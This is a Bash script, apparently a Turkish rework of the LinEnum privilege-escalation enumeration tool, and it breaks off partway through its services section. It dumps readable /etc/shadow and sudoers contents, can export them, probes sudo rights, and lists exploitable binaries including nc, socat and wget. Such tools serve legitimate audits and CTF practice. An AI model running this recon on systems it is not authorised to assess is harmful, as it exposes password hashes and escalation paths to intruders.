#!/usr/bin/env bash

# Yerel Linux Bilgi Toplama & Yetki Yükseltme Betiği
# Tam Türkçe versiyon - Tüm fonksiyonlar eksiksiz
# @vedattascier

version="sürüm 4.0 ENTERPRISE - ML Enhanced"
output_format="text"   # text | md | json
risk_profile="standard" # strict | standard | relaxed
quiet=""                 # 1 = sadece özetleri/önerileri göster
auto=""                  # 1 = otomatik çalıştır
interrupted=0            # kesinti durumunda
use_colors="1"          # 1 = renk kodları kullan
fast_mode=""            # 1 = hızlı tarama
MAX_FIND_RESULTS=${MAX_FIND_RESULTS:-200}
FIND_TIMEOUT=${FIND_TIMEOUT:-20}
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" >/dev/null 2>&1 && pwd)"
REPORT_FILE="${REPORT_FILE:-$SCRIPT_DIR/yetkiyukseltme_report_$(date +%Y%m%d_%H%M%S).txt}"
RESULT_FILE="$SCRIPT_DIR/sonuclar.txt"
if [ -e "$RESULT_FILE" ]; then
  count=1
  while [ -e "$SCRIPT_DIR/sonuclar_$count.txt" ]; do
    count=$((count+1))
  done
  RESULT_FILE="$SCRIPT_DIR/sonuclar_$count.txt"
fi
mkdir -p "$SCRIPT_DIR" 2>/dev/null
printf "--------------------\nYetki yükseltme tarama sonuçları - %s\nDosya: %s\nSürüm: %s\n--------------------\n" "$(date)" "$RESULT_FILE" "$version" > "$RESULT_FILE" 2>/dev/null
exec > >(tee -a "$RESULT_FILE") 2>&1
SCAN_START_TIME=$(date +%s)
SCAN_START_DATE=$(date '+%Y-%m-%d %H:%M:%S')

# Renk kodları (koşullu olarak set edilir)
disable_colors() {
  NC=""
  RED=""
  YELLOW=""
  GREEN=""
  CYAN=""
  MAGENTA=""
}

NC="\e[0m"
RED="\e[00;31m"
YELLOW="\e[00;33m"
GREEN="\e[00;32m"
CYAN="\e[00;36m"
MAGENTA="\e[00;35m"

# Risk puanları
risk_score=0
critical_count=0
high_count=0
medium_count=0
low_count=0

# Rapor kaydı için yardımcı
log_finding() {
  local sev="$1"
  local msg="$2"
  local sev_label="${sev}"

  case "$sev" in
    HIGH)
      sev_label="YÜKSEK"
      ;;
    CRITICAL)
      sev_label="KRİTİK"
      ;;
    MEDIUM)
      sev_label="ORTA"
      ;;
    LOW)
      sev_label="DÜŞÜK"
      ;;
    INFO)
      sev_label="BİLGİ"
      ;;
    *)
      sev_label="$sev"
      ;;
  esac

  echo "[$sev_label] $msg" >> "$REPORT_FILE"
}

command_exists() {
  command -v "$1" >/dev/null 2>&1
}

# Güvenli find işlemi
safe_find() {
  local timeout_val="${FIND_TIMEOUT}s"
  local path="$1"
  local conditions="$2"
  timeout "$timeout_val" find "$path" $conditions 2>/dev/null || true
}

# Performans ölçümü
print_timing() {
  local elapsed=$(($(date +%s) - SCAN_START_TIME))
  echo -e "${CYAN}Gecen sure: ${elapsed}s${NC}"
}

# SQLite veritabanı desteği
init_database() {
    if command_exists sqlite3; then
        DB_FILE="${SCRIPT_DIR}/security_scans.db"
        
        # Veritabanı tablolarını oluştur
        sqlite3 "$DB_FILE" << EOF
CREATE TABLE IF NOT EXISTS scans (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    timestamp TEXT NOT NULL,
    hostname TEXT,
    risk_score INTEGER,
    critical_count INTEGER,
    high_count INTEGER,
    medium_count INTEGER,
    low_count INTEGER,
    scan_duration INTEGER,
    version TEXT
);

CREATE TABLE IF NOT EXISTS findings (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    scan_id INTEGER,
    severity TEXT,
    category TEXT,
    description TEXT,
    recommendation TEXT,
    FOREIGN KEY (scan_id) REFERENCES scans(id)
);
EOF
        echo -e "${GREEN}[+] SQLite veritabanı hazır${NC}"
    else
        echo -e "${YELLOW}[!] SQLite yüklü değil - geçmiş taramalar saklanmayacak${NC}"
    fi
}

# Tarama sonuçlarını veritabanına kaydet
save_to_database() {
    if [ -f "$DB_FILE" ]; then
        local scan_id=$(sqlite3 "$DB_FILE" "INSERT INTO scans (timestamp, hostname, risk_score, critical_count, high_count, medium_count, low_count, scan_duration, version) VALUES ('$(date '+%Y-%m-%d %H:%M:%S')', '$(hostname)', $risk_score, $critical_count, $high_count, $medium_count, $low_count, $(( $(date +%s) - SCAN_START_TIME )), '$version'); SELECT last_insert_rowid();")
        
        # Önemli bulguları kaydet
        if [ "$critical_count" -gt 0 ]; then
            sqlite3 "$DB_FILE" "INSERT INTO findings (scan_id, severity, category, description, recommendation) VALUES ($scan_id, 'CRITICAL', 'SYSTEM', 'Kritik güvenlik açıkları tespit edildi', 'Derhal müdahale edin');"
        fi
        if [ "$high_count" -gt 0 ]; then
            sqlite3 "$DB_FILE" "INSERT INTO findings (scan_id, severity, category, description, recommendation) VALUES ($scan_id, 'YUKSEK', 'HIZMETLER', 'Yüksek riskli servis yapılandırması', 'Servisleri gözden geçirin');"
        fi
        
        echo -e "${GREEN}[+] Tarama veritabanına kaydedildi (ID: $scan_id)${NC}"
    fi
}

# Geçmiş taramaları karşılaştır
compare_with_history() {
    if [ -f "$DB_FILE" ]; then
        echo -e "\e[00;33m### TARİHSEL KARŞILAŞTIRMA ###################\e[00m"
        
        # Son 5 taramayı al
        local history=$(sqlite3 "$DB_FILE" "SELECT timestamp, risk_score, critical_count, high_count FROM scans ORDER BY id DESC LIMIT 5;")
        
        if [ -n "$history" ]; then
            echo -e "${CYAN}Son 5 taramanın karşılaştırması:${NC}"
            echo "Tarih                  | Risk | Kritik | Yüksek"
            echo "-----------------------|------|--------|-------"
            echo "$history" | while IFS='|' read -r timestamp score crit high; do
                printf "%-23s| %-4s | %-6s | %-6s\n" "$timestamp" "$score" "$crit" "$high"
            done
            
            # Trend analizi
            local avg_risk=$(sqlite3 "$DB_FILE" "SELECT AVG(risk_score) FROM scans ORDER BY id DESC LIMIT 5;")
            local trend="STABLE"
            
            if (( $(echo "$avg_risk > $risk_score + 10" | bc -l 2>/dev/null || echo "0") )); then
                trend="IMPROVING"
                echo -e "${GREEN}[+] Güvenlik durumu iyileşiyor${NC}"
            elif (( $(echo "$risk_score > $avg_risk + 10" | bc -l 2>/dev/null || echo "0") )); then
                trend="WORSENING"
                echo -e "${RED}[!] Güvenlik durumu kötüleşiyor${NC}"
            else
                echo -e "${YELLOW}[-] Güvenlik durumu stabil${NC}"
            fi
        else
            echo -e "${YELLOW}[-] Geçmiş tarama bulunamadı${NC}"
        fi
        echo ""
    fi
}

print_header() {
  echo -e "\n${CYAN}=== $1 ===${NC}"
}

print_finding() {
  local sev="$1"
  local msg="$2"
  echo -e "${YELLOW}[$sev]${NC} $msg"
  log_finding "$sev" "$msg"
}

version_in_range() {
  local version="${1%%-*}"
  local min="${2%%-*}"
  local max="${3%%-*}"

  if [ "$(printf '%s\n%s\n%s\n' "$min" "$version" "$max" | sort -V | head -n1)" = "$min" ] && \
     [ "$(printf '%s\n%s\n%s\n' "$min" "$version" "$max" | sort -V | tail -n1)" = "$max" ]; then
    return 0
  fi
  return 1
}

check_root() {
  if [ "$(id -u)" -eq 0 ]; then
    echo -e "${GREEN}[+] Root olarak çalışıyor${NC}"
  else
    echo -e "${YELLOW}[!] Root değil - bazı kontroller eksik olabilir${NC}"
  fi
}

# Zarif kesinti: özet/öneri göster ve çık
trap 'stty sane; interrupted=1; echo -e "\n\e[00;31m[!] Tarama kullanıcı tarafından durduruldu. Özet ve öneriler:\e[00m"; advanced_reporting; footer; exit 130' INT TERM

# Yardım fonksiyonu
usage()
{
echo -e "\n${RED}#########################################################${NC}"
echo -e "${RED}#${NC} ${YELLOW}Yerel Linux Bilgi Toplama & Yetki Yükseltme Betiği${NC} ${RED}#${NC}"
echo -e "${RED}#########################################################${NC}"
echo -e "${YELLOW}# www.vedattascier.com | @vedattascier ${NC}"
echo -e "${YELLOW}# $version${NC}\n"

echo -e "${CYAN}KULLANIM:${NC}"
echo "  $0 [SEÇENEKLER]"
echo
echo -e "${CYAN}SEÇENEKLER:${NC}"
echo "  -h, --help              Bu yardımı göster"
echo "  -v, --verbose           Ayrıntılı çıktı (varsayılan)"
echo "  -q, --quiet            Sadece özet ve öneriler göster"
echo "  -j, --json              JSON formatında çıktı"
echo "  -m, --markdown          Markdown formatında çıktı"
echo "  -f, --fast              Hızlı tarama (find timeout 5s)"
echo "  -t, --thorough          Ayrıntılı tarama (timeout 60s)"
echo "  -k, --keyword ANAHTAR   Anahtar kelimesi ara"
echo "  -e, --export DİZİN      Dışa aktar"
echo "  -p, --password          Sudo parolası sor"
echo "  -r, --report DOSYA      Raporu kaydet"
echo "  --risk [s|std|r]       Risk profili"
echo "  --max-results N         Max bulgu (def: 200)"
echo "  --find-timeout N        Find timeout (def: 20)"
echo "  --no-colors             Renkleri kapat"
echo "  --fix-script            Otomatik düzeltme script'i oluştur"
echo "  --html-report           HTML rapor oluştur"
echo "  --database              SQLite veritabanı kullan"
echo "  --version               Versiyon"
echo
echo -e "${CYAN}ÖRNEKLER:${NC}"
echo "  $0                    # Normal tarama"
echo "  $0 -f -q              # Hızlı + özet"
echo "  $0 -t -j | tee o.json # Ayrıntılı + JSON"
echo "  $0 --html-report      # HTML rapor ile"
echo "  $0 --fix-script       # Otomatik düzeltme script'i"
echo "  $0 --database         # Veritabanı ile geçmiş karşılaştırma"
echo
echo -e "${RED}#########################################################${NC}"
}

# Faydalı ikililer listesi (GTFOBins referanslı)
binarylist='aria2c\|arp\|ash\|awk\|base64\|bash\|busybox\|cat\|chmod\|chown\|cp\|csh\|curl\|cut\|dash\|date\|dd\|diff\|dmsetup\|docker\|ed\|emacs\|env\|expand\|expect\|file\|find\|flock\|fmt\|fold\|ftp\|gawk\|gdb\|gimp\|git\|grep\|head\|ht\|iftop\|ionice\|ip$\|irb\|jjs\|jq\|jrunscript\|ksh\|ld.so\|ldconfig\|less\|logsave\|lua\|make\|man\|mawk\|more\|mv\|mysql\|nano\|nawk\|nc\|netcat\|nice\|nl\|nmap\|node\|od\|openssl\|perl\|pg\|php\|pic\|pico\|python\|readelf\|rlwrap\|rpm\|rpmquery\|rsync\|ruby\|run-parts\|rvim\|scp\|script\|sed\|setarch\|sftp\|sh\|shuf\|socat\|sort\|sqlite3\|ssh$\|start-stop-daemon\|stdbuf\|strace\|systemctl\|tail\|tar\|taskset\|tclsh\|tee\|telnet\|tftp\|time\|timeout\|ul\|unexpand\|uniq\|unshare\|vi\|vim\|watch\|wget\|wish\|xargs\|xxd\|zip\|zsh'

# Başlık
header()
{
echo -e "\n${RED}#########################################################${NC}"
echo -e "${RED}#${NC} ${YELLOW}Yerel Linux Bilgi Toplama & Yetki Yükseltme Betiği${NC} ${RED}#${NC}"
echo -e "${RED}#########################################################${NC}"
echo -e "${YELLOW}# www.vedattascier.com${NC}"
echo -e "${YELLOW}# $version - Format: $output_format - Profil: $risk_profile${NC}\n"
}

# Hata ayıklama bilgisi
debug_info()
{
echo -e "${CYAN}[-] Konfigürasyon Bilgisi${NC}"
echo "    Çıktı Format: $output_format"
echo "    Risk Profili: $risk_profile"
echo "    Maks. Bulgu: $MAX_FIND_RESULTS"
echo "    Find Timeout: ${FIND_TIMEOUT}s"
echo "    Hızlı Mod: ${fast_mode:-Devre dışı}"
echo "    Ayrıntılı: ${thorough:-Kapalı}"

if [ "$keyword" ]; then
        echo -e "    ${YELLOW}[+] Anahtar: $keyword${NC}"
fi

if [ "$report" ]; then
        echo -e "    ${YELLOW}[+] Rapor: $report${NC}"
fi

if [ "$export" ]; then
        echo -e "    ${YELLOW}[+] Export: $export${NC}"
fi

if [ "$quiet" = "1" ]; then
        echo -e "    ${YELLOW}[+] Sessiz Mod: Aktif${NC}"
fi

echo ""

if [ "$export" ]; then
  mkdir -p -- "$export" 2>/dev/null
  format="$export/LinEnum-export-`date +"%d-%m-%y"`"
  mkdir -p -- "$format" 2>/dev/null
fi

if [ "$sudopass" ]; then
  echo -e "\e[00;35m[+] Lütfen parolayı girin - GÜVENSİZ - yalnızca CTF için!\e[00m"
  read -s userpassword
  echo
fi

who=`whoami` 2>/dev/null
echo -e "\n"

START_TS=`date +%s` 2>/dev/null
echo -e "\e[00;33mTarama başlangıç zamanı:"; date
echo -e "\e[00m\n"
}

# Ayrıntılı tarama notu
thorough_note()
{
  echo -e "\e[00;36m[Açıklama] Ayrıntılı tarama modu aktiftir. Bu mod ek olarak:\e[00m"
  echo "- Pasif systemd zamanlayıcılarını listeler"
  echo "- / ve /home üzerinde gizli dosyaları tarar"
  echo "- Herkese okunabilir ve yazılabilir dosyaları listeler"
  echo "- Kullanıcıya ait olmayan ama grupça yazılabilir dosyaları gösterir"
  echo "- Kullanıcınıza ait tüm dosyaları listeler"
  echo "- SSH anahtar/host dosyalarını arar"
  echo "- Tarama süresi artabilir"
  echo
}

# Sistem bilgisi
system_info()
{
echo -e "\e[00;33m### SİSTEM ##############################################\e[00m"

# Temel kernel bilgisi
unameinfo=`uname -a 2>/dev/null`
if [ "$unameinfo" ]; then
  echo -e "\e[00;31m[-] Çekirdek bilgisi:\e[00m\n$unameinfo"
  echo -e "\n"
fi

procver=`cat /proc/version 2>/dev/null`
if [ "$procver" ]; then
  echo -e "\e[00;31m[-] Çekirdek bilgisi (devam):\e[00m\n$procver"
  echo -e "\n"
fi

# Tüm *-release dosyalarını sürüm bilgisi için ara
release=`cat /etc/*-release 2>/dev/null`
if [ "$release" ]; then
  echo -e "\e[00;31m[-] Dağıtım sürüm bilgisi:\e[00m\n$release"
  echo -e "\n"
fi

# Hedef hostname bilgisi
hostnamed=`hostname 2>/dev/null`
if [ "$hostnamed" ]; then
  echo -e "\e[00;31m[-] Ana makine adı:\e[00m\n$hostnamed"
  echo -e "\n"
fi

# CPU bilgisi
cpuinfo=`lscpu 2>/dev/null || cat /proc/cpuinfo 2>/dev/null`
if [ "$cpuinfo" ]; then
  echo -e "\e[00;31m[-] CPU bilgisi:\e[00m\n$cpuinfo"
  echo -e "\n"
fi

# Bellek bilgisi
meminfo=`free -h 2>/dev/null || cat /proc/meminfo 2>/dev/null`
if [ "$meminfo" ]; then
  echo -e "\e[00;31m[-] Bellek bilgisi:\e[00m\n$meminfo"
  echo -e "\n"
fi

# Disk bilgisi
diskinfo=`df -h 2>/dev/null`
if [ "$diskinfo" ]; then
  echo -e "\e[00;31m[-] Disk kullanımı:\e[00m\n$diskinfo"
  echo -e "\n"
fi

# Çalışma süresi
uptimeinfo=`uptime 2>/dev/null`
if [ "$uptimeinfo" ]; then
  echo -e "\e[00;31m[-] Sistem çalışma süresi:\e[00m\n$uptimeinfo"
  echo -e "\n"
fi
}

# Kullanıcı/Grup bilgisi
user_info()
{
echo -e "\e[00;33m### KULLANICI/GRUP ######################################\e[00m"

# Mevcut kullanıcı detayları
currusr=`id 2>/dev/null`
if [ "$currusr" ]; then
  echo -e "\e[00;31m[-] Geçerli kullanıcı/grup bilgisi:\e[00m\n$currusr"
  echo -e "\n"
fi

# Son giriş yapan kullanıcı bilgisi
lastlogedonusrs=`lastlog 2>/dev/null |grep -v "Never" 2>/dev/null`
if [ "$lastlogedonusrs" ]; then
  echo -e "\e[00;31m[-] Sisteme daha önce giriş yapan kullanıcılar:\e[00m\n$lastlogedonusrs"
  echo -e "\n"
fi

# Başka kimler oturum açmış
loggedonusrs=`w 2>/dev/null`
if [ "$loggedonusrs" ]; then
  echo -e "\e[00;31m[-] Başka kimler oturum açmış:\e[00m\n$loggedonusrs"
  echo -e "\n"
fi

# Tüm id'leri ve ilgili grup(lar)ı listele
grpinfo=`for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null`
if [ "$grpinfo" ]; then
  echo -e "\e[00;31m[-] Grup üyelikleri:\e[00m\n$grpinfo"
  echo -e "\n"
fi

# adm grubundaki kullanıcılar
adm_users=$(echo -e "$grpinfo" | grep "(adm)")
if [[ ! -z $adm_users ]];
  then
    echo -e "\e[00;31m[-] Yönetici (adm) grubunda kullanıcılar bulundu:\e[00m\n$adm_users"
    echo -e "\n"
fi

# /etc/passwd'de hash olup olmadığını kontrol et
hashesinpasswd=`grep -v '^[^:]*:[x]' /etc/passwd 2>/dev/null`
if [ "$hashesinpasswd" ]; then
  echo -e "\e[00;33m[+] /etc/passwd içinde parola özetleri bulunuyor!\e[00m\n$hashesinpasswd"
  echo -e "\n"
fi

# /etc/passwd içeriği
readpasswd=`cat /etc/passwd 2>/dev/null`
if [ "$readpasswd" ]; then
  echo -e "\e[00;31m[-] /etc/passwd içeriği:\e[00m\n$readpasswd"
  echo -e "\n"
fi

if [ "$export" ] && [ "$readpasswd" ]; then
  mkdir -p $format/etc-export/ 2>/dev/null
  cp /etc/passwd $format/etc-export/passwd 2>/dev/null
fi

# Shadow dosyası okunabilir mi
readshadow=`cat /etc/shadow 2>/dev/null`
if [ "$readshadow" ]; then
  echo -e "\e[00;33m[+] Shadow dosyasını okuyabiliyoruz!\e[00m\n$readshadow"
  echo -e "\n"
fi

if [ "$export" ] && [ "$readshadow" ]; then
  mkdir -p $format/etc-export/ 2>/dev/null
  cp /etc/shadow $format/etc-export/shadow 2>/dev/null
fi

# Tüm root hesapları (uid 0)
superman=`grep -v -E "^#" /etc/passwd 2>/dev/null| awk -F: '$3 == 0 { print $1}' 2>/dev/null`
if [ "$superman" ]; then
  echo -e "\e[00;31m[-] Süper kullanıcı hesapları:\e[00m\n$superman"
  echo -e "\n"
fi

# Sudoers bilgisi
sudoers=`grep -v -e '^$' /etc/sudoers 2>/dev/null |grep -v "#" 2>/dev/null`
if [ "$sudoers" ]; then
  echo -e "\e[00;31m[-] Sudoers yapılandırması (özet):\e[00m\n$sudoers"
  echo -e "\n"
fi

if [ "$export" ] && [ "$sudoers" ]; then
  mkdir -p $format/etc-export/ 2>/dev/null
  cp /etc/sudoers $format/etc-export/sudoers 2>/dev/null
fi

# Parola girmeden sudo yapabiliyor muyuz
sudoperms=`echo '' | sudo -S -l -k 2>/dev/null`
if [ "$sudoperms" ]; then
  echo -e "\e[00;33m[+] Parola girmeden sudo yapabiliyoruz!\e[00m\n$sudoperms"
  echo -e "\n"
fi

# Parola ile sudo yetkileri
if [ "$sudopass" ]; then
    if [ "$sudoperms" ]; then
      :
    else
      sudoauth=`echo $userpassword | sudo -S -l -k 2>/dev/null`
      if [ "$sudoauth" ]; then
        echo -e "\e[00;33m[+] Parola girerek sudo yapabiliyoruz!\e[00m\n$sudoauth"
        echo -e "\n"
      fi
    fi
fi

# Sudo ile çalıştırılabilen faydalı ikililer
sudopwnage=`echo '' | sudo -S -l -k 2>/dev/null | xargs -n 1 2>/dev/null | sed 's/,*$//g' 2>/dev/null | grep -w $binarylist 2>/dev/null`
if [ "$sudopwnage" ]; then
  echo -e "\e[00;33m[+] Olası sudo ayrıcalık yükseltme fırsatları!\e[00m\n$sudopwnage"
  echo -e "\n"
fi

# Kimler sudo kullanmış
whohasbeensudo=`find /home -name .sudo_as_admin_successful 2>/dev/null`
if [ "$whohasbeensudo" ]; then
  echo -e "\e[00;31m[-] Son zamanlarda sudo kullanan hesaplar:\e[00m\n$whohasbeensudo"
  echo -e "\n"
fi

# /root dizinine erişilebiliyor mu
rthmdir=`ls -ahl /root/ 2>/dev/null`
if [ "$rthmdir" ]; then
  echo -e "\e[00;33m[+] /root dizinini okuyabiliyoruz!\e[00m\n$rthmdir"
  echo -e "\n"
fi

# /home dizini izinleri
homedirperms=`ls -ahl /home/ 2>/dev/null`
if [ "$homedirperms" ]; then
  echo -e "\e[00;31m[-] /home dizin izinleri gevşek mi:\e[00m\n$homedirperms"
  echo -e "\n"
fi

# Bize ait olmayan yazılabilir dosyalar
if [ "$thorough" = "1" ]; then
  echo -e "\e[00;36m[Bilgi] Grup yazılabilir (başka kullanıcıya ait) dosyalar aranıyor...\e[00m"
  grfiles_paths=$(timeout ${FIND_TIMEOUT}s bash -c 'find / -xdev -writable ! -user "'"`whoami`"'"' -type f ! -path "/proc/*" ! -path "/sys/*" ! -path "/dev/*" 2>/dev/null)
  find_status=$?
  if [ "$grfiles_paths" ]; then
    grfiles_display=$(echo "$grfiles_paths" | head -n ${MAX_FIND_RESULTS})
    grfiles_info=$(while IFS= read -r f; do ls -al "$f" 2>/dev/null; done <<< "$grfiles_display")
    echo -e "\e[00;31m[-] Kullanıcıya ait olmayan ancak grup tarafından yazılabilir dosyalar (ilk ${MAX_FIND_RESULTS} sonuç):\e[00m"
    [ -n "$grfiles_info" ] && echo "$grfiles_info"
    total_gr=$(echo "$grfiles_paths" | wc -l)
    if [ $total_gr -gt ${MAX_FIND_RESULTS} ]; then
      echo -e "\e[00;33m[!] Toplam $total_gr sonuç bulundu; yalnızca ilk ${MAX_FIND_RESULTS} sonuç gösteriliyor.\e[00m"
    fi
  else
    echo -e "\e[00;32m[-] Grup yazılabilir yabancı dosya bulunamadı.\e[00m"
  fi
  if [ $find_status -eq 124 ]; then
    echo -e "\e[00;33m[!] Arama ${FIND_TIMEOUT}s sonunda durduruldu.\e[00m"
  fi
  echo
fi

# Bize ait dosyalar
if [ "$thorough" = "1" ]; then
  echo -e "\e[00;36m[Bilgi] Kullanıcınıza ait dosyalar listeleniyor...\e[00m"
  ourfiles_paths=$(timeout ${FIND_TIMEOUT}s bash -c 'find / -xdev -user "'"`whoami`"'"' -type f ! -path "/proc/*" ! -path "/sys/*" ! -path "/dev/*" 2>/dev/null)
  find_status=$?
  if [ "$ourfiles_paths" ]; then
    ourfiles_display=$(echo "$ourfiles_paths" | head -n ${MAX_FIND_RESULTS})
    ourfiles_info=$(while IFS= read -r f; do ls -al "$f" 2>/dev/null; done <<< "$ourfiles_display")
    echo -e "\e[00;31m[-] Kullanıcımıza ait dosyalar (ilk ${MAX_FIND_RESULTS} sonuç):\e[00m"
    [ -n "$ourfiles_info" ] && echo "$ourfiles_info"
    total_our=$(echo "$ourfiles_paths" | wc -l)
    if [ $total_our -gt ${MAX_FIND_RESULTS} ]; then
      echo -e "\e[00;33m[!] Toplam $total_our sonuç bulundu; yalnızca ilk ${MAX_FIND_RESULTS} sonuç gösteriliyor.\e[00m"
    fi
  else
    echo -e "\e[00;32m[-] Kullanıcınıza ait özel dosya bulunamadı.\e[00m"
  fi
  if [ $find_status -eq 124 ]; then
    echo -e "\e[00;33m[!] Arama ${FIND_TIMEOUT}s sonunda durduruldu.\e[00m"
  fi
  echo
fi

# SSH root girişi açık mı
sshrootlogin=`grep "PermitRootLogin " /etc/ssh/sshd_config 2>/dev/null | grep -v "#" | awk '{print  $2}'`
if [ "$sshrootlogin" = "yes" ]; then
  echo -e "\e[00;33m[+] Root kullanıcısının SSH ile girişi etkin:\e[00m" ; grep "PermitRootLogin " /etc/ssh/sshd_config 2>/dev/null | grep -v "#"
  echo -e "\n"
fi
}

# Ortam bilgisi
environmental_info()
{
echo -e "\e[00;33m### ORTAM ###############################################\e[00m"

# Ortam değişkenleri
envinfo=`env 2>/dev/null | grep -v 'LS_COLORS' 2>/dev/null`
if [ "$envinfo" ]; then
  echo -e "\e[00;31m[-] Ortam değişkenleri:\e[00m\n$envinfo"
  echo -e "\n"
fi

# SELinux durumu
sestatus=`sestatus 2>/dev/null`
if [ "$sestatus" ]; then
  echo -e "\e[00;31m[-] SELinux etkin görünüyor:\e[00m\n$sestatus"
  echo -e "\n"
fi

# PATH yapılandırması
pathinfo=$(printf '%s' "$PATH" 2>/dev/null)
if [ "$pathinfo" ]; then
  echo -e "\e[00;31m[-] PATH bilgisi:\e[00m\n$pathinfo"
  echo -e "\e[00;31m[-] PATH dizini izinleri:\e[00m"
  IFS=":" read -r -a path_dirs <<< "$PATH"
  for dir in "${path_dirs[@]}"; do
    if [ -n "$dir" ] && [ -e "$dir" ]; then
      ls -ld "$dir" 2>/dev/null
    else
      echo -e "${YELLOW}[!] PATH içinde mevcut değil veya erişilemez: $dir${NC}"
    fi
  done
  echo -e "\n"
fi

# Kullanılabilir kabuklar
shellinfo=`cat /etc/shells 2>/dev/null`
if [ "$shellinfo" ]; then
  echo -e "\e[00;31m[-] Kullanılabilir kabuklar:\e[00m\n$shellinfo"
  echo -e "\n"
fi

# Umask değeri
umaskvalue=$(umask -S 2>/dev/null)
if [ "$umaskvalue" ]; then
  echo -e "\e[00;31m[-] Geçerli umask değeri:\e[00m\n$umaskvalue"
  echo -e "\n"
fi

# /etc/login.defs'teki umask değeri
umaskdef=`grep -i "^UMASK" /etc/login.defs 2>/dev/null`
if [ "$umaskdef" ]; then
  echo -e "\e[00;31m[-] /etc/login.defs içindeki umask değeri:\e[00m\n$umaskdef"
  echo -e "\n"
fi

# Parola politikası bilgisi
logindefs=`grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs 2>/dev/null`
if [ "$logindefs" ]; then
  echo -e "\e[00;31m[-] Parola ve saklama bilgileri:\e[00m\n$logindefs"
  echo -e "\n"
fi

if [ "$export" ] && [ "$logindefs" ]; then
  mkdir -p $format/etc-export/ 2>/dev/null
  cp /etc/login.defs $format/etc-export/login.defs 2>/dev/null
fi
}

# Görevler/Zamanlayıcı
job_info()
{
echo -e "\e[00;33m### GÖREVLER/ZAMANLAYICI ################################\e[00m"

# Cron işleri
cronjobs=`ls -la /etc/cron* 2>/dev/null`
if [ "$cronjobs" ]; then
  echo -e "\e[00;31m[-] Cron görevleri:\e[00m\n$cronjobs"
  echo -e "\n"
fi

# Dünya-yazılabilir cron işleri
cronjobwwperms=`find /etc/cron* -perm -0002 -type f -exec ls -la {} \; -exec cat {} 2>/dev/null \; 2>/dev/null`
if [ "$cronjobwwperms" ]; then
  echo -e "\e[00;33m[+] Dünya-yazılabilir cron görevleri ve içerikleri:\e[00m\n$cronjobwwperms"
  echo -e "\n"
fi

# Crontab içeriği
crontabvalue=`cat /etc/crontab 2>/dev/null`
if [ "$crontabvalue" ]; then
  echo -e "\e[00;31m[-] Crontab içeriği:\e[00m\n$crontabvalue"
  echo -e "\n"
fi

crontabvar=`ls -la /var/spool/cron/crontabs 2>/dev/null`
if [ "$crontabvar" ]; then
  echo -e "\e[00;31m[-] /var/spool/cron/crontabs içinde ilginç bir şey var mı:\e[00m\n$crontabvar"
  echo -e "\n"
fi

# Anacron işleri
anacronjobs=`ls -la /etc/anacrontab 2>/dev/null; cat /etc/anacrontab 2>/dev/null`
if [ "$anacronjobs" ]; then
  echo -e "\e[00;31m[-] Anacron görevleri ve dosya izinleri:\e[00m\n$anacronjobs"
  echo -e "\n"
fi

# Diğer kullanıcıların cron işleri
cronother=`cut -d ":" -f 1 /etc/passwd 2>/dev/null | xargs -n1 crontab -l -u 2>/dev/null`
if [ "$cronother" ]; then
  echo -e "\e[00;31m[-] Kullanıcıların cron görevleri:\e[00m\n$cronother"
  echo -e "\n"
fi

# Systemd zamanlayıcıları
systemdtimers="$(systemctl list-timers 2>/dev/null |head -n -1 2>/dev/null)"
if [ "$systemdtimers" ]; then
  echo -e "\e[00;31m[-] Systemd zamanlayıcıları:\e[00m\n$systemdtimers"
  echo -e "\n"
fi
}

# Ağ bilgisi
networking_info()
{
echo -e "\e[00;33m### AĞ ###################################################\e[00m"

# Ağ kartı bilgisi
nicinfo=`/sbin/ifconfig -a 2>/dev/null`
if [ "$nicinfo" ]; then
  echo -e "\e[00;31m[-] Ağ ve IP bilgisi:\e[00m\n$nicinfo"
  echo -e "\n"
fi

# Ağ bilgisi (ip komutu)
nicinfoip=`/sbin/ip a 2>/dev/null`
if [ ! "$nicinfo" ] && [ "$nicinfoip" ]; then
  echo -e "\e[00;31m[-] Ağ ve IP bilgisi:\e[00m\n$nicinfoip"
  echo -e "\n"
fi

# ARP geçmişi
arpinfo=`arp -a 2>/dev/null`
if [ "$arpinfo" ]; then
  echo -e "\e[00;31m[-] ARP geçmişi:\e[00m\n$arpinfo"
  echo -e "\n"
fi

# DNS ayarları
nsinfo=`grep "nameserver" /etc/resolv.conf 2>/dev/null`
if [ "$nsinfo" ]; then
  echo -e "\e[00;31m[-] Ad Sunucuları (DNS):\e[00m\n$nsinfo"
  echo -e "\n"
fi

# Dinleyen TCP bağlantıları
if command_exists netstat; then
  tcpservs=$(netstat -ntpl 2>/dev/null)
  udpservs=$(netstat -nupl 2>/dev/null)
  activecons=$(netstat -natp 2>/dev/null)
elif command_exists ss; then
  tcpservs=$(ss -tnlp 2>/dev/null)
  udpservs=$(ss -nulp 2>/dev/null)
  activecons=$(ss -natp 2>/dev/null)
fi

if [ "$tcpservs" ]; then
  echo -e "\e[00;31m[-] Dinleyen TCP bağlantıları:\e[00m\n$tcpservs"
  echo -e "\n"
fi

if [ "$udpservs" ]; then
  echo -e "\e[00;31m[-] Dinleyen UDP bağlantıları:\e[00m\n$udpservs"
  echo -e "\n"
fi

if [ "$activecons" ]; then
  echo -e "\e[00;31m[-] Aktif ağ bağlantıları:\e[00m\n$activecons"
  echo -e "\n"
fi

# İptables / nftables kuralları
if command_exists iptables; then
  iptablesrules=$(iptables -L 2>/dev/null)
  if [ "$iptablesrules" ]; then
    echo -e "\e[00;31m[-] İptables kuralları:\e[00m\n$iptablesrules"
    echo -e "\n"
  fi
elif command_exists nft; then
  nftables=$(nft list ruleset 2>/dev/null)
  if [ "$nftables" ]; then
    echo -e "\e[00;31m[-] NFTables kuralları:\e[00m\n$nftables"
    echo -e "\n"
  fi
fi
}

# Servisler
services_info()
{
echo -e "\e[00;33m### SERVİSLER ###########################################\e[00m"

# Çalışan süreçler
psaux=`ps aux 2>/dev/null`
if [ "$psaux" ]; then
  echo -e "\e[00;31m[-] Çalışan süreçler:\e[00m\n$psaux"
  echo -e "\n"
fi

# Süreç ikilileri ve izinleri
procperm=`ps aux 2>/dev/null | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++' 2>/dev/null`
if [ "$procperm" ]; then
